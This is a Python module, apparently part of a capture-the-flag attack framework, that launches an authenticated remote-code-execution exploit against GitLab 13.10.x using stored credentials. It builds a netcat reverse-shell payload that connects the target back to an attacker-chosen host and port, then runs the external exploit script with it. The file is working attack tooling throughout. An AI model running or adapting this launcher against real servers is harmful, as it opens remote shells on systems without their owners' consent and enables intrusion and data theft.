def run(data, cred, args):
    import subprocess
    from pathlib import Path
    from core.target import get_current_url
    from core.paths import get_tools_dir
    from core.attacker import resolve_lhost

    # --- COLORS ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD, DIM = '\033[1m', '\033[2m'

    # ---------------- CONFIG ----------------
    target = get_current_url(data)
    tool_path = get_tools_dir() / "gitlab" / "gitlab_13_10_2_rce.py"

    # ---------------- VALIDATION ----------------
    if not target:
        print(f"{R}[!] {W}No target URL found")
        return data

    if not tool_path.exists():
        print(f"{R}[!] {W}Exploit not found: {tool_path}")
        return data

    if not cred:
        print(f"{R}[!] {W}No credentials set (ctf target add-cred)")
        return data

    user = cred.get("user")
    password = cred.get("secret")

    if not user or not password:
        print(f"{R}[!] {W}Credential missing username/password")
        return data

    # ---------------- NETWORK ----------------
    lhost = resolve_lhost(args)
    lport = getattr(args, "lport", None) or "4444"

    if not lhost:
        print(f"{R}[!] {W}Could not determine LHOST")
        return data

    # ---------------- NORMALIZE TARGET ----------------
    if not target.startswith("http"):
        target = f"http://{target}"

    if ":" not in target.split("//")[1]:
        target = f"{target}:8081"

    # ---------------- PAYLOAD ----------------
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f"

    # ---------------- HUD ----------------
    print(f"\n{B}┌── {BOLD}MODULE: GITLAB RCE (13.10.x){W}{B} ─────────────────────┐{W}")
    print(f"{B}│{W}  {B}{'Target:':<12}{W} {C}{target:<36}{W} {B}│{W}")
    print(f"{B}│{W}  {B}{'User:':<12}{W} {W}{user:<36}{W} {B}│{W}")
    print(f"{B}│{W}  {B}{'LHOST:':<12}{W} {Y}{lhost:<36}{W} {B}│{W}")
    print(f"{B}│{W}  {B}{'LPORT:':<12}{W} {Y}{lport:<36}{W} {B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    print(f"\n{B}[{W}{G}*{W}{B}]{W} {DIM}Launching exploit...{W}\n")

    # ---------------- COMMAND ----------------
    cmd = [
        "python3",
        str(tool_path),
        "-t", target,
        "-u", user,
        "-p", password,
        "-c", payload
    ]

    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"{R}[!] Error: {e}")

    return data
